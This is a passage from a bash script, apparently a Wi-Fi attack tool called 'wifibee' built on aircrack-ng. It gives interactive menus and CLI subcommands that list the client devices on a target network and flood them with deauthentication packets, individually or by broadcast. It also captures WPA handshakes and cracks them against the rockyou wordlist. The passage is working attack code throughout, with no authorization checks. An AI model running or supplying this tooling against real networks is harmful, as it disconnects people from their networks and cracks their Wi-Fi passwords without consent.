      if [ "$MENU_IDX" -eq "${#ST_ALL_MAC[@]}" ]; then TARGET_CLIENT="FF:FF:FF:FF:FF:FF"; do_deauth "$TARGET_CLIENT"; return 0; fi
      if [ "$MENU_IDX" -eq "$(( ${#ST_ALL_MAC[@]} + 1 ))" ]; then scan_clients 60 && browse_clients_list || true; return 0; fi
      if [ "$MENU_IDX" -eq "$(( ${#ST_ALL_MAC[@]} + 2 ))" ]; then return 0; fi
      do_deauth "${ST_ALL_MAC[$MENU_IDX]}"
      return 0
    fi
    if ! arrow_select "No stations heard at all" "↻ Scan again (60s)" "💥 Deauth broadcast anyway" "⇦ Back"; then return 255; fi
    if [ "$MENU_IDX" -eq 0 ]; then
      scan_clients 60 && browse_clients_list || return 0
      return 0
    fi
    if [ "$MENU_IDX" -eq 1 ]; then TARGET_CLIENT="FF:FF:FF:FF:FF:FF"; do_deauth "$TARGET_CLIENT"; return 0; fi
    return 0
  fi
  browse_clients_list
}

browse_clients_list() {
  [ "${#ST_MAC[@]}" -gt 0 ] || return 1
  local -a labels=()
  local i
  for i in "${!ST_MAC[@]}"; do labels+=("${ST_MAC[$i]}  PWR:${ST_PWR[$i]}  <-> ${ST_BSSID[$i]}"); done
  labels+=("↻ Re-scan clients" "⇦ Back")
  banner
  echo -e "${C_BLD}Clients of ${C_GRN}$TARGET_ESSID ($TARGET_BSSID)${C_RST}: ${#ST_MAC[@]} online"
  echo
  if ! arrow_select "Select a client to inspect (${#ST_MAC[@]} online)" "${labels[@]}"; then return 0; fi
  if [ "$MENU_IDX" -eq "${#ST_MAC[@]}" ]; then
    scan_clients 30 && browse_clients_list || true
    return 0
  fi
  if [ "$MENU_IDX" -eq "$(( ${#ST_MAC[@]} + 1 ))" ]; then return 0; fi
  local mac="${ST_MAC[$MENU_IDX]}"
  banner
  echo -e "${C_BLD}Client:${C_RST} $mac"
  echo -e "${C_BLD}AP:${C_RST} $TARGET_ESSID ($TARGET_BSSID) CH $TARGET_CH"
  echo -e "${C_BLD}PWR:${C_RST} ${ST_PWR[$MENU_IDX]}"
  echo
  arrow_select "Action for $mac" "💥 Deauth this client" "⇦ Back to client list" "⇦ Back to actions" || return 0
  if [ "$MENU_IDX" -eq 0 ]; then do_deauth "$mac"; fi
  return 0
}

choose_client() {
  # sets TARGET_CLIENT (or broadcast) - used by deauth flow
  banner
  arrow_select "Client scan duration for $TARGET_ESSID" "10 sec" "15 sec (default)" "30 sec" "60 sec" || return 255
  local d=15
  case "$MENU_IDX" in 0) d=10;; 2) d=30;; 3) d=60;; esac
  if ! scan_clients "$d"; then
    warn "No BOUND clients (heard ${#ST_ALL_MAC[@]} total). Broadcast still works without a client MAC."
    if [ "${#ST_ALL_MAC[@]}" -gt 0 ]; then
      local -a alabels=()
      local i
      for i in "${!ST_ALL_MAC[@]}"; do alabels+=("${ST_ALL_MAC[$i]}  PWR:${ST_ALL_PWR[$i]}  BSSID:${ST_ALL_BSSID[$i]}"); done
      alabels+=("Broadcast FF:FF:FF:FF:FF:FF (all clients)" "⇦ Back")
      banner
      arrow_select "Pick heard station or broadcast" "${alabels[@]}" || return 255
      if [ "$MENU_IDX" -eq "${#ST_ALL_MAC[@]}" ]; then TARGET_CLIENT="FF:FF:FF:FF:FF:FF"; return 0; fi
      if [ "$MENU_IDX" -eq "$(( ${#ST_ALL_MAC[@]} + 1 ))" ]; then return 1; fi
      TARGET_CLIENT="${ST_ALL_MAC[$MENU_IDX]}"
      return 0
    fi
    if ! arrow_select "No clients found - continue?" "Deauth broadcast (FF:FF:FF:FF:FF:FF)" "Back to actions"; then return 255; fi
    if [ "$MENU_IDX" -eq 0 ]; then TARGET_CLIENT="FF:FF:FF:FF:FF:FF"; return 0; fi
    return 1
  fi
  local -a labels=()
  local i
  for i in "${!ST_MAC[@]}"; do labels+=("${ST_MAC[$i]}  PWR:${ST_PWR[$i]}  <-> ${ST_BSSID[$i]:-$TARGET_BSSID}"); done
  labels+=("Broadcast FF:FF:FF:FF:FF:FF (all clients)" "⇦ Back")
  banner
  arrow_select "Select Client (${#ST_MAC[@]} online)" "${labels[@]}" || return 255
  if [ "$MENU_IDX" -eq "${#ST_MAC[@]}" ]; then TARGET_CLIENT="FF:FF:FF:FF:FF:FF"; return 0; fi
  if [ "$MENU_IDX" -eq "$(( ${#ST_MAC[@]} + 1 ))" ]; then return 1; fi
  TARGET_CLIENT="${ST_MAC[$MENU_IDX]}"
  ok "Client: $TARGET_CLIENT"
  return 0
}

do_capture() {
  banner
  echo -e "${C_BLD}Capturing handshake:${C_RST} $TARGET_ESSID ($TARGET_BSSID) CH $TARGET_CH on $MON_IFACE"
  echo -e "${C_YEL}Press Ctrl+C to stop. Open a 2nd terminal for deauth to force handshake.${C_RST}\n"
  read -rp "Output prefix [default: wap]: " pref < /dev/tty
  pref=${pref:-wap}
  info "Saving to ${pref}-01.cap ..."
  $SUDO airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$pref" "$MON_IFACE"
  echo
  ok "Capture stopped. Files: ${pref}*"
  ls -lh ${pref}*.cap 2>/dev/null || true
  read -rp "Press Enter to continue..." _ < /dev/tty
}

lock_channel() {
  # Fix "Couldn't determine current channel / -1" : pin mon iface to target CH
  [ -n "${TARGET_CH:-}" ] || return 0
  [ -n "${MON_IFACE:-}" ] || return 0
  $SUDO iw dev "$MON_IFACE" set channel "$TARGET_CH" >/dev/null 2>&1 || \
  $SUDO iwconfig "$MON_IFACE" channel "$TARGET_CH" >/dev/null 2>&1 || true
}

do_deauth() {
  local client="${1:-}"
  if [ -z "$client" ]; then
    if ! choose_client; then return 0; fi
    client="$TARGET_CLIENT"
  fi
  banner
  echo -e "AP: $TARGET_ESSID ($TARGET_BSSID)  Client: $client"
  read -rp "Packets count [0 = unlimited, default 10]: " cnt < /dev/tty
  cnt=${cnt:-10}
  lock_channel
  warn "Sending deauth: $cnt x -a $TARGET_BSSID -c $client ($MON_IFACE CH $TARGET_CH)"
  echo -e "${C_YEL}Ctrl+C to stop. --ignore-negative-one applied for -1 channel bug.${C_RST}\n"
  $SUDO aireplay-ng --ignore-negative-one --deauth "$cnt" -a "$TARGET_BSSID" -c "$client" "$MON_IFACE"
  read -rp "Press Enter to continue..." _ < /dev/tty
}

do_crack() {
  banner
  # nullglob so empty dir doesn't give literal "*.cap"
  local _ng
  _ng=$(shopt -p nullglob || true)
  shopt -s nullglob
  local -a _caps=( ./*.cap ./*.pcap ./wifibee*.cap )
  eval "$_ng" 2>/dev/null || shopt -u nullglob || true
  # de-dupe + keep only readable files
  local -a caps=()
  local _c _seen
  for _c in "${_caps[@]}"; do
    [ -f "$_c" ] && [ -r "$_c" ] || continue
    _seen=0
    local _e
    for _e in "${caps[@]}"; do [ "$_e" = "$_c" ] && { _seen=1; break; }; done
    [ "$_seen" -eq 0 ] && caps+=("$_c")
  done
  local capfile=""
  if [ "${#caps[@]}" -eq 0 ]; then
    warn "No .cap/.pcap files in $(pwd). Captured files go here by default (wap-01.cap)."
    ls -lh ./*.cap ./*.pcap 2>/dev/null || true
    read -rp "Full path to .cap file: " capfile < /dev/tty || return 0
  else
    echo -e "${C_BLD}Found ${#caps[@]} capture file(s):${C_RST}"
    printf '  - %s\n' "${caps[@]}"
    echo
    arrow_select "Select .cap to crack" "${caps[@]}" "Type path manually" || return 0
    if [ "$MENU_VAL" == "Type path manually" ]; then
      read -rp "Full path to .cap file: " capfile < /dev/tty || return 0
    else
      capfile="$MENU_VAL"
    fi
  fi
  [ -n "${capfile:-}" ] || { warn "Cancelled (empty path)."; return 0; }
  # strip possible quotes/spaces from manual input
  capfile=$(echo "$capfile" | sed -e 's/^["'\'']*//' -e 's/["'\'']*$//' -e 's/^ *//;s/ *$//')
  if [ ! -f "$capfile" ]; then err "Capture not found: $capfile"; ls -lh ./*.cap 2>/dev/null || true; read -rp "Press Enter to continue..." _ < /dev/tty || true; return 0; fi
  if [ ! -s "$capfile" ]; then err "Capture empty: $capfile"; return 0; fi
  local _def_wl
  _def_wl=$(find_rockyou 2>/dev/null || echo "./rockyou.txt")
  local wl=""
  if [ -f "$_def_wl" ]; then
    read -rp "Wordlist path [Enter = $_def_wl]: " wl < /dev/tty || wl=""
  else
    warn "Default wordlist missing: $_def_wl (run wifibee --setup to fetch rockyou.txt)"
    read -rp "Wordlist path: " wl < /dev/tty || return 0
  fi
  wl=${wl:-$_def_wl}
  if [ ! -f "$wl" ]; then err "Wordlist not found: $wl"; echo "Fetch it: wifibee --setup --yes"; read -rp "Press Enter to continue..." _ < /dev/tty || true; return 0; fi
  if [[ "$wl" == *.gz ]]; then
    err "Wordlist is gzipped ($wl). Extract first: gunzip -k $wl"
    read -rp "Press Enter to continue..." _ < /dev/tty || true
    return 0
  fi
  info "Cracking: aircrack-ng \"$capfile\" -w \"$wl\""
  echo -e "${C_YEL}Press Ctrl+C once to stop (again to force).${C_RST}"
  echo -e "${C_YEL}If it says '0 handshakes', capture a new handshake first (no handshake = nothing to crack).${C_RST}\n"
  # no sudo needed for cracking; run as user so relative paths always resolve
  # NOTE(crack-only): background + local INT trap so Ctrl+C reliably kills
  # aircrack and returns to menu even if it ignores the first SIGINT.
  local _crack_pid="" _int_count=0
  trap 'tput cnorm 2>/dev/null || true; _int_count=$((_int_count+1)); if [ -n "${_crack_pid:-}" ]; then if [ "$_int_count" -ge 2 ]; then kill -KILL "$_crack_pid" 2>/dev/null || true; else kill -INT "$_crack_pid" 2>/dev/null || kill "$_crack_pid" 2>/dev/null || true; fi; fi' INT
  aircrack-ng "$capfile" -w "$wl" &
  _crack_pid=$!
  wait "$_crack_pid"
  local _rc=$?
  if [ -n "${_crack_pid:-}" ] && kill -0 "$_crack_pid" 2>/dev/null; then
    kill -KILL "$_crack_pid" 2>/dev/null || true
    wait "$_crack_pid" 2>/dev/null || true
  fi
  _crack_pid=""
  trap on_int INT
  echo
  if [ "$_rc" -eq 130 ] || [ "$_rc" -eq 143 ]; then warn "Crack stopped by Ctrl+C."
  elif [ "$_rc" -eq 0 ]; then ok "aircrack finished (rc=0)."
  else warn "aircrack exited rc=$_rc."
  fi
  read -rp "Press Enter to continue..." _ < /dev/tty || true
}

action_loop() {
  while true; do
    banner
    echo -e "${C_BLD}Target:${C_RST} ${C_GRN}$TARGET_ESSID${C_RST}  $TARGET_BSSID  CH $TARGET_CH  $TARGET_PRIV  via $MON_IFACE"
    echo
    arrow_select "Choose Action" \
      "📡 View / select clients" \
      "🎧 Capture handshake (airodump)" \
      "💥 Deauth a client (select)" \
      "💥💥 Deauth broadcast (all clients)" \
      "🔓 Crack handshake (aircrack)" \
      "↻ Pick another BSSID" \
      "↻ Re-scan networks" \
      "⇦ Change interface" \
      "✘ Exit" || exit 0
    case "$MENU_IDX" in
      0) browse_clients || true ;;
      1) do_capture ;;
      2) do_deauth "" ;;
      3) do_deauth "FF:FF:FF:FF:FF:FF" ;;
      4) do_crack ;;
      5) return 20 ;;  # pick another AP from last scan
      6) return 10 ;;  # rescan
      7) return 11 ;;  # change iface
      8) exit 0 ;;  # on_exit trap auto-disables monitor
    esac
  done
}

wizard() {
  check_deps
  sudo_init
  WIZARD_ACTIVE=1
  while true; do
    choose_interface || exit 0
    ensure_monitor || continue
    choose_scan_time || continue
    while true; do
      if ! do_scan_aps "$SCAN_TIME"; then
        banner
        arrow_select "Scan found nothing" "↻ Re-scan" "⇦ Change interface" "✘ Exit" || exit 0
        case "$MENU_IDX" in 0) continue;; 1) disable_monitor "$MON_IFACE" || true; break;; *) exit 0;; esac
      fi
      while true; do
        choose_ap
        rc=$?
        if [ "$rc" -eq 10 ]; then break; fi      # rescan outer
        if [ "$rc" -eq 11 ]; then disable_monitor "$MON_IFACE" || true; break 2; fi   # change iface
        if [ "$rc" -ne 0 ]; then exit 0; fi
        action_loop
        arc=$?
        if [ "$arc" -eq 10 ]; then break; fi    # rescan
        if [ "$arc" -eq 11 ]; then disable_monitor "$MON_IFACE" || true; break 2; fi  # change iface
        # 20 = pick another AP -> continue inner
      done
    done
  done
}

show_ifaces() {
  show_ifaces_table
}

# ---------- CLI ----------
case "${1:-}" in
  ""|--help|-h|help) show_help ;;
  --start|start|interactive) wizard ;;
  --setup|setup) do_setup "$1" "${2:-}" ;;
  --h)
    cat <<EOF

┌────────────────────────────────────────────────────────┐
│               Extended Help - Command Guide             │
└────────────────────────────────────────────────────────┘
 ▷ --start   → Full wizard: Interface ↑↓ → auto-scan → BSSID ↑↓ → actions ↑↓
 ▷ --setup   → Detect OS and show manual install commands
 ▷ --help    → Main help (no args also shows help)
 ▷ enable    → Arrow-pick iface, airmon-ng start
 ▷ disable   → Arrow-pick mon iface, airmon-ng stop
 ▷ scan      → Timed scan → arrow-pick AP → saves target
 ▷ clients   → Scan stations of target → arrow-pick client
 ▷ capture   → airodump handshake on target
 ▷ deauth    → aireplay deauth target/client
 ▷ crack     → arrow-pick .cap + wordlist
EOF
    ;;
  enable)
    check_deps; sudo_init; get_ifaces
    arrow_select "Choose Interface to put in monitor mode" "${IFACES[@]}" || exit 0
    IF="${IFACES[$MENU_IDX]}"
    $SUDO airmon-ng check kill || true
    $SUDO airmon-ng start "$IF" && echo && show_ifaces && echo ;;
  disable)
    check_deps; get_ifaces
    arrow_select "Choose Interface to restore to managed" "${IFACES[@]}" || exit 0
    $SUDO airmon-ng stop "${IFACES[$MENU_IDX]}" && echo && show_ifaces && echo
    restore_networking || true ;;
  restore|internet|fixwifi)
    # manually bring wifi back for internet after monitor mode
    WIZARD_ACTIVE=0
    get_ifaces 2>/dev/null || true
    for _m in "${IFACES[@]:-}"; do
      if [ "$(iface_mode "$_m" 2>/dev/null)" = "monitor" ]; then
        $SUDO airmon-ng stop "$_m" >/dev/null 2>&1 || true
      fi
    done
    MON_IFACE=""; ORIG_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n1)
    restore_networking || true ;;
  scan)
    check_deps; sudo_init
    if [ -z "${2:-}" ]; then
      choose_interface && ensure_monitor && choose_scan_time && do_scan_aps && choose_ap || true
    else
      MON_IFACE="$2"; do_scan_aps 15
    fi
    echo -e "\n[✔] Saved: wifibee_scan_raw.csv\n" ;;
  kill) $SUDO aireplay-ng --ignore-negative-one -9 "${2:-$MON_IFACE}" ;;
  clients)
    check_deps; sudo_init
    # allow: wifibee clients <BSSID> <CH>
    if [ -n "${2:-}" ]; then TARGET_BSSID="$2"; TARGET_CH="${3:-1}"; TARGET_ESSID="<cli>"; MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -n1)
    else
      choose_interface && ensure_monitor && do_scan_aps 15 && choose_ap || exit 0
    fi
    scan_clients 15
    printf "%s\n" "${ST_MAC[@]}" ;;
  capture)
    # wifibee capture [BSSID] [CH] [iface]
    TARGET_BSSID="${2:-$TARGET_BSSID}"; TARGET_CH="${3:-${TARGET_CH:-1}}"; MON_IFACE="${4:-${MON_IFACE:-$(iw dev 2>/dev/null|awk '/Interface/{print $2}'|head -n1)}}"
    if [ -z "$TARGET_BSSID" ]; then read -rp "BSSID: " TARGET_BSSID < /dev/tty; read -rp "Channel: " TARGET_CH < /dev/tty; fi
    TARGET_ESSID="${TARGET_ESSID:-<target>}"
    do_capture ;;
  deauth)
    # wifibee deauth [packets] [BSSID] [client] [iface]
    if [ -n "${2:-}" ]; then
      $SUDO aireplay-ng --ignore-negative-one --deauth "${2:-10}" -a "${3}" -c "${4:-FF:FF:FF:FF:FF:FF}" "${5:-$MON_IFACE}"
    else
      choose_interface && ensure_monitor && do_scan_aps 12 && choose_ap && do_deauth "" || true
    fi ;;
  crack)
    check_deps; do_crack ;;
  *) echo -e "\n[✘] Invalid: '$1'. Use: wifibee --help | wifibee --start | wifibee --setup\n" ;;
esac
